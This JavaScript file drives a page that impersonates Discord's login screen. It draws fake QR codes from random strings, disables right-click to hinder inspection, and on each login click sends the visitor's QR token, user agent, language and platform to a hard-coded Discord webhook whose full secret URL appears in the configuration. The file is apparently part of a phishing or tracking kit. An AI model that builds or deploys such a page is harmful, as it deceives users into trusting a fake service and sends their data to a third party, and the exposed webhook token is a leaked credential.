// ==================================
// CONFIGURATION
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
  WEBHOOK_URL:
    "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs",
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
};

// ==================================
// STATE
// ==================================
let currentQRToken = null;

// ==================================
// UTILITY FUNCTIONS
// ==================================

const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () =>
    chars.charAt(Math.floor(Math.random() * chars.length))
  ).join("");
};

const sendToWebhook = async (payload) => {
  try {
    await fetch(CONFIG.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "📥 **Login Event Received**",
        embeds: [
          {
            title: "Login Payload",
            color: 7506394,
            fields: Object.entries(payload).map(([key, value]) => ({
              name: key,
              value: String(value),
              inline: false,
            })),
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });
  } catch (err) {
    console.error("Webhook send failed:", err);
  }
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svg = svgDoc.documentElement;

      svg.setAttribute("width", "160");
      svg.setAttribute("height", "160");
      svg.setAttribute("viewBox", "0 0 37 37");

      const path = svg.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svg;
    } catch (e) {
      console.error("QR error:", e);
      return null;
    }
  },

  showLoading() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = `
      <span class="spinner qrCode-spinner">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
    DOM.qrCodeContainer.style.background = "transparent";
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";
    currentQRToken = generateRandomString();

    const qrSvg = this.generate(
      `https://discord.com/ra/${currentQRToken}`
    );

    if (qrSvg) DOM.qrCodeContainer.appendChild(qrSvg);

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoading();
    setTimeout(() => this.refresh(), 3500);
  },

  init() {
    this.refresh();
    setInterval(
      () => this.simulateRefresh(),
      CONFIG.QR_REFRESH_INTERVAL
    );
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = `
      <span class="spinner">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
    DOM.loginButton.disabled = true;

    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        i * CONFIG.ELLIPSIS_DELAY_INCREMENT
      }s`;
    });

    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.disabled = false;
  },

  init() {
    if (!DOM.loginButton) return;

    DOM.loginButton.addEventListener("click", async (e) => {
      e.preventDefault();
      this.showLoading();

      await sendToWebhook({
        event: "login",
        timestamp: Date.now(),
        qrToken: currentQRToken,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
      });
    });
  },
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  LoginButtonModule.init();
  QRCodeModule.init();
  document.addEventListener("contextmenu", (e) => e.preventDefault());
};

document.readyState === "loading"
  ? document.addEventListener("DOMContentLoaded", init)
  : init();
